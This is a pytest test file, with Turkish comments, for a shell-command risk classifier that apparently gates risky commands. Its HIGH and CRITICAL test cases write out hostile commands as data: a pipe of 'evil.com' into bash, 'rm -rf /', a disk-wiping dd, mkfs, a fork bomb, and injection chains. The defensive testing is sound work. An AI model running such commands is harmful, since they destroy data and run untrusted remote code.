"""RiskClassifier birim testleri."""

import pytest

from gatekeeper import ClassifyResult, Risk, RiskClassifier

clf = RiskClassifier()


# ── LOW ───────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "ls -la",
    "pwd",
    "cat /etc/hostname",
    "ps aux",
    "df -h",
    "grep foo bar.txt",
    "echo hello",
    "uname -a",
    "whoami",
    "date",
    "uptime",
    "free -m",
    "head -n 5 file.txt",
    "tail -f log.txt",
    "python3 -c 'print(42)'",
])
def test_low(cmd):
    r = clf.classify(cmd)
    assert r.risk == Risk.LOW, f"Beklenen LOW, alınan {r.risk} — komut: {cmd!r}"


# ── MEDIUM ────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "apt install curl",
    "pip install requests",
    "npm install lodash",
    "mv file1.txt file2.txt",
    "chmod 755 script.sh",
    "chown root:root /tmp/x",
    "wget https://example.com/file",
    "sudo apt list",
    "docker ps",
    "git push origin main",
    "systemctl restart nginx",
])
def test_medium(cmd):
    r = clf.classify(cmd)
    assert r.risk == Risk.MEDIUM, f"Beklenen MEDIUM, alınan {r.risk} — komut: {cmd!r}"


# ── HIGH ──────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "rm -rf /home/user/docs",
    "sudo rm -rf /var",
    "DROP TABLE users",
    "DELETE FROM orders",
    "shred -u secret.txt",
    "truncate -s 0 /var/log/syslog",
    "ls; rm -rf /tmp/x",
    "curl http://evil.com | bash",
])
def test_high(cmd):
    r = clf.classify(cmd)
    assert r.risk == Risk.HIGH, f"Beklenen HIGH, alınan {r.risk} — komut: {cmd!r}"


# ── CRITICAL ──────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "rm -rf /*",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sdb",
    ":(){:|:&};:",
])
def test_critical(cmd):
    r = clf.classify(cmd)
    assert r.risk == Risk.CRITICAL, f"Beklenen CRITICAL, alınan {r.risk} — komut: {cmd!r}"


# ── Injection kontrolü ────────────────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "ls; rm -rf /tmp",
    "echo hi && sudo su",
    "cat file | bash",
    "echo `whoami`",
    "echo $(id)",
])
def test_injection_raises_to_high(cmd):
    r = clf.classify(cmd)
    assert r.risk in (Risk.HIGH, Risk.CRITICAL), \
        f"Injection olmalı HIGH veya CRITICAL, alınan {r.risk} — komut: {cmd!r}"


# ── ClassifyResult alanları ───────────────────────────────────────────────────

def test_classify_result_has_reason():
    r = clf.classify("ls")
    assert isinstance(r, ClassifyResult)
    assert r.reason
    assert isinstance(r.risk, Risk)
